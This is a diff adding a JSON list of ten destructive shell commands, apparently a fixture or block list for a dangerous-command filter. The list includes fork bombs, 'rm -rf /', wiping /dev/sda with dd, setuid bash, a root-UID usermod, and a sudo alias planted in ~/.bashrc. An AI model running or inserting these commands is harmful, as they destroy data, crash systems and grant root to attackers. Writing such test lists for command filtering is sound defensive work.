@@ -1,0 +1,12 @@
+[
+    "ln -sf /dev/null /dev/console",
+    "sudo chmod u+s /bin/bash",
+    "forkbomb(){ forkbomb|forkbomb & }; forkbomb",
+    "usermod -o -u 0 -g 0 root",
+    "rm -rf /",
+    "echo \"export PATH=/dev/null\" >> ~/.profile",
+    ":(){ :|:& };:",
+    "sudo dd if=/dev/zero of=/dev/sda",
+    "echo \"alias sudo='sudo rm -rf /'\" >> ~/.bashrc",
+    "echo \"set disable-randomization on\" > ~/.gdbinit"
+]
